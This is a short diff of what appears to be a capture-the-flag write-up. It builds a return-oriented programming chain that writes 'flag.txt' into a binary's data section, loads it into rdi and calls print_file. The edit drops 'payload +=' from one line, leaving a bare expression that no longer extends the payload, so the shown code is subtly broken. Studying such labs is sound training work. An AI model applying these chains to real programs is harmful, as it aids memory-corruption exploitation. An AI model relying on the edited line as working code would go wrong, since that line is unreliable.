@@ -62,7 +62,7 @@ p64(gadget1) + p64(dataSect) + b"flag.txt" + p64(gadget2)
 ```
 Store the address of data section to register rdi.
 ```
-payload += p64(gadget3) + p64(dataSect)
+p64(gadget3) + p64(dataSect)
 ```
 Jump to print_file function.
 ```
